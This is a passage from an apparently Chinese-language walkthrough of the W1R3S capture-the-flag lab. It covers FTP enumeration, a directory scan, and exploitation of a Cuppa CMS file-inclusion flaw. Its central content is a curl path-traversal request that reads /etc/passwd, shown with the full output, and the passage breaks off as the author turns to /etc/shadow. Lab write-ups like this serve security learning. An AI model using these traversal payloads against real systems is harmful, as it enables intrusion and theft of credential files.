ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd docs</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||48758|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; binary</span><br><span class="line">200 Switching to Binary mode.</span><br><span class="line">ftp&gt; maget worktodo.txt</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; mget worktodo.txt</span><br><span class="line">mget worktodo.txt [anpqy?]? </span><br><span class="line">229 Entering Extended Passive Mode (|||43505|)</span><br><span class="line">150 Opening BINARY mode data connection for worktodo.txt (138 bytes).</span><br><span class="line">100% |*************************************************|   138       46.77 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">138 bytes received in 00:00 (34.29 KiB/s)</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||49142|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd ../</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||45915|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd new-employees</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||45613|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp           155 Jan 28  2018 employee-names.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; binary </span><br><span class="line">200 Switching to Binary mode.</span><br><span class="line">ftp&gt; mget employee-names.txt</span><br><span class="line">mget employee-names.txt [anpqy?]? </span><br><span class="line">229 Entering Extended Passive Mode (|||47785|)</span><br><span class="line">150 Opening BINARY mode data connection for employee-names.txt (155 bytes).</span><br><span class="line">100% |*************************************************|   155       59.68 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">155 bytes received in 00:00 (43.70 KiB/s)</span><br><span class="line">ftp&gt; exit</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure></p><p>ftp里面有三个文件夹，里面的文件分别转换成二进制形式下载下来</p><p>打开，01看着没什么东西，02里面有个base64的，另一个用hash-id看是不是md5<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cat 01.txt</span><br><span class="line">New FTP Server For W1R3S.inc</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cat 02.txt</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span><br><span class="line">############################################</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cat 03.txt</span><br><span class="line">___________.__              __      __  ______________________   _________    .__               </span><br><span class="line">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </span><br><span class="line">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </span><br><span class="line">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </span><br><span class="line">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</span><br><span class="line">                \/     \/         \/                \/       \/        \/  \/         \/     \/ </span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ hash-identifier &#x27;01ec2d8fc11c493b25029fb1f47f39ce&#x27;</span><br><span class="line">   #########################################################################</span><br><span class="line">   #     __  __                     __           ______    _____           #</span><br><span class="line">   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span><br><span class="line">   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span><br><span class="line">   #     \ \  _  \  /&#x27;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span><br><span class="line">   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span><br><span class="line">   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span><br><span class="line">   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span><br><span class="line">   #                                                             By Zion3R #</span><br><span class="line">   #                                                    www.Blackploit.com #</span><br><span class="line">   #                                                   Root@Blackploit.com #</span><br><span class="line">   #########################################################################</span><br><span class="line">--------------------------------------------------</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5(HMAC)</span><br><span class="line">[+] MD4(HMAC)</span><br><span class="line">[+] MD2(HMAC)</span><br><span class="line">[+] MD5(HMAC(Wordpress))</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Haval-128(HMAC)</span><br><span class="line">[+] RipeMD-128</span><br><span class="line">[+] RipeMD-128(HMAC)</span><br><span class="line">[+] SNEFRU-128</span><br><span class="line">[+] SNEFRU-128(HMAC)</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Tiger-128(HMAC)</span><br><span class="line">[+] md5($pass.$salt)</span><br><span class="line">[+] md5($salt.$pass)</span><br><span class="line">[+] md5($salt.$pass.$salt)</span><br><span class="line">[+] md5($salt.$pass.$username)</span><br><span class="line">[+] md5($salt.md5($pass))</span><br><span class="line">[+] md5($salt.md5($pass))</span><br><span class="line">[+] md5($salt.md5($pass.$salt))</span><br><span class="line">[+] md5($salt.md5($pass.$salt))</span><br><span class="line">[+] md5($salt.md5($salt.$pass))</span><br><span class="line">[+] md5($salt.md5(md5($pass).$salt))</span><br><span class="line">[+] md5($username.0.$pass)</span><br><span class="line">[+] md5($username.LF.$pass)</span><br><span class="line">[+] md5($username.md5($pass).$salt)</span><br><span class="line">[+] md5(md5($pass))</span><br><span class="line">[+] md5(md5($pass).$salt)</span><br><span class="line">[+] md5(md5($pass).md5($salt))</span><br><span class="line">[+] md5(md5($salt).$pass)</span><br><span class="line">[+] md5(md5($salt).md5($pass))</span><br><span class="line">[+] md5(md5($username.$pass).$salt)</span><br><span class="line">[+] md5(md5(md5($pass)))</span><br><span class="line">[+] md5(md5(md5(md5($pass))))</span><br><span class="line">[+] md5(md5(md5(md5(md5($pass)))))</span><br><span class="line">[+] md5(sha1($pass))</span><br><span class="line">[+] md5(sha1(md5($pass)))</span><br><span class="line">[+] md5(sha1(md5(sha1($pass))))</span><br><span class="line">[+] md5(strtoupper(md5($pass)))</span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH: </span><br></pre></td></tr></table></figure></p><p>里面没什么东西了，看看其他文件夹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cat employee-names.txt </span><br><span class="line">The W1R3S.inc employee list</span><br><span class="line"></span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>给了个人名以及工作职位，人名可能存在密码的爆破</p><p>看看最后一个文件<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cat worktodo.txt      </span><br><span class="line">        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</span><br><span class="line"></span><br><span class="line">....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</span><br></pre></td></tr></table></figure></p><p>倒过来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">        ı don&#x27;t thınk thıs ıs the way to root!</span><br><span class="line">we have a ןot of work to do‘ stop pןayıng around˙˙˙˙</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>别浪了，还有恁多事没整呢,这玩意搞不到root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">扫了一下后台</span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ dirsearch -u  http://192.168.159.134</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/桌面/reports/http_192.168.159.134/_24-06-30_15-38-38.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.134/</span><br><span class="line"></span><br><span class="line">[15:38:39] Starting: </span><br><span class="line">[15:38:41] 403 -  301B  - /.ht_wsr.txt</span><br><span class="line">[15:38:41] 403 -  304B  - /.htaccess.bak1</span><br><span class="line">[15:38:41] 403 -  304B  - /.htaccess.orig</span><br><span class="line">[15:38:41] 403 -  306B  - /.htaccess.sample</span><br><span class="line">[15:38:41] 403 -  304B  - /.htaccess.save</span><br><span class="line">[15:38:42] 403 -  304B  - /.htaccess_orig</span><br><span class="line">[15:38:42] 403 -  305B  - /.htaccess_extra</span><br><span class="line">[15:38:42] 403 -  302B  - /.htaccess_sc</span><br><span class="line">[15:38:42] 403 -  302B  - /.htaccessBAK</span><br><span class="line">[15:38:42] 403 -  303B  - /.htaccessOLD2</span><br><span class="line">[15:38:42] 403 -  295B  - /.html</span><br><span class="line">[15:38:42] 403 -  294B  - /.htm</span><br><span class="line">[15:38:42] 403 -  302B  - /.htaccessOLD</span><br><span class="line">[15:38:42] 403 -  300B  - /.htpasswds</span><br><span class="line">[15:38:42] 403 -  301B  - /.httr-oauth</span><br><span class="line">[15:38:42] 403 -  304B  - /.htpasswd_test</span><br><span class="line">[15:38:43] 403 -  294B  - /.php</span><br><span class="line">[15:38:43] 403 -  295B  - /.php3</span><br><span class="line">[15:38:58] 301 -  326B  - /administrator  -&gt;  http://192.168.159.134/administrator/</span><br><span class="line">[15:38:58] 302 -    7KB - /administrator/  -&gt;  installation/</span><br><span class="line">[15:38:58] 302 -    7KB - /administrator/index.php  -&gt;  installation/</span><br><span class="line">[15:39:24] 301 -  323B  - /javascript  -&gt;  http://192.168.159.134/javascript/</span><br><span class="line">[15:39:48] 403 -  304B  - /server-status/</span><br><span class="line">[15:39:48] 403 -  303B  - /server-status</span><br><span class="line">[15:40:06] 301 -    0B  - /wordpress/  -&gt;  http://localhost/wordpress/</span><br><span class="line">[15:40:06] 200 -    1KB - /wordpress/wp-login.php</span><br><span class="line"></span><br><span class="line">Task Completed</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问<code>http://192.168.159.134/administrator/installation/</code><br>暴露了是cuppa cms</p><p><img src="https://pic.imgdb.cn/item/66810c72d9c307b7e9d623b9.png" alt=""></p><p>next看能不能建造一个，但是最后不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Installation</span><br><span class="line">Installation Error</span><br><span class="line">Edit file [Configuration.php]Yes</span><br><span class="line">Create tablesYes</span><br><span class="line">Administrator&#x27;s user createdNo</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们用searchsploit搜索一下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ searchsploit cuppa   </span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                              |  Path</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclu | php/webapps/25971.txt</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>google搜了一下存在一个任意文件下载的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&#123;baseurl&#125;/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>访问一下是</p><p><img src="https://pic.imgdb.cn/item/66810f50d9c307b7e9d9cd57.png" alt=""></p><p>我们使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.159.134/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure><p>如名使用curl访问<a href="http://192.168.159.134/administrator/alerts/alertConfigField.php，且参数为urlConfig=../../../../../../../../../etc/passwd">http://192.168.159.134/administrator/alerts/alertConfigField.php，且参数为urlConfig=../../../../../../../../../etc/passwd</a> 。请求时要对数据进行url编码</p><p>因为url一般是get请求，我们要暴改成post请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.159.134/administrator/alerts/alertConfigField.php </span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .new_content&#123;</span><br><span class="line">        position: fixed;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_field&#123;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        background:#FFF;</span><br><span class="line">        position:relative;</span><br><span class="line">        border-radius: 3px;</span><br><span class="line">        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);</span><br><span class="line">        overflow:hidden;</span><br><span class="line">        position:fixed;</span><br><span class="line">        top:50%;</span><br><span class="line">        left:50%;</span><br><span class="line">        width:600px;</span><br><span class="line">        height:440px;</span><br><span class="line">        margin-left:-300px;</span><br><span class="line">        margin-top:-220px;</span><br><span class="line">    &#125;</span><br><span class="line">    .alert_config_top&#123;</span><br><span class="line">        position: relative;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-bottom: 0px;</span><br><span class="line">        border: 1px solid #D2D2D2;</span><br><span class="line">        background: #4489F8;</span><br><span class="line">        overflow: auto;</span><br><span class="line">        color:#FFF;</span><br><span class="line">        font-size: 13px;</span><br><span class="line">        padding: 7px 5px;</span><br><span class="line">        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);</span><br><span class="line">        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);</span><br><span class="line">    &#125;</span><br><span class="line">    .description_alert&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        text-shadow:0 1px #FFFFFF;</span><br><span class="line">        font-weight: normal;</span><br><span class="line">        padding: 5px 0px 5px 0px;</span><br><span class="line">    &#125;</span><br><span class="line">    .btnClose_alert&#123;</span><br><span class="line">        position:absolute;</span><br><span class="line">        top: 4px; right: 2px;</span><br><span class="line">        width:22px;</span><br><span class="line">        height:22px;</span><br><span class="line">        cursor:pointer;</span><br><span class="line">        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;</span><br><span class="line">        background-position: center;</span><br><span class="line">        background-size: 13px;</span><br><span class="line">    &#125;</span><br><span class="line">    .content_alert_config&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        clear:both;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-top: 0px;</span><br><span class="line">        height: 401px;</span><br><span class="line">        padding: 10px;</span><br><span class="line">        overflow: auto;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        function CloseDefaultAlert()&#123;</span><br><span class="line">                cuppa.setContent(&#123;&#x27;load&#x27;:false, duration:0.2&#125;);</span><br><span class="line">        cuppa.blockade(&#123;&#x27;load&#x27;:false, duration:0.2, delay:0.1&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div class=&quot;alert_config_field&quot; id=&quot;alert&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;alert_config_top&quot;&gt;</span><br><span class="line">        &lt;strong&gt;Configuration&lt;/strong&gt;:         &lt;div class=&quot;btnClose_alert&quot; id=&quot;btnClose_alert&quot; onclick=&quot;CloseDefaultAlert()&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;content_alert_config&quot; class=&quot;content_alert_config&quot;&gt;</span><br><span class="line">        root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:106:110::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:107:111::/run/uuidd:/bin/false</span><br><span class="line">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">whoopsie:x:109:117::/nonexistent:/bin/false</span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false</span><br><span class="line">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span><br><span class="line">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false</span><br><span class="line">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br><span class="line">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false</span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/false</span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</span><br><span class="line">w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash</span><br><span class="line">sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false</span><br><span class="line">mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;                                      </span><br></pre></td></tr></table></figure><p> 在现在linux系统中，passwd文件里面所有账户的密码都是用x代替的，真正的密码（加密后）放在/etc/shadow中</p><p>我们把最后的/passwd改成shadow</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 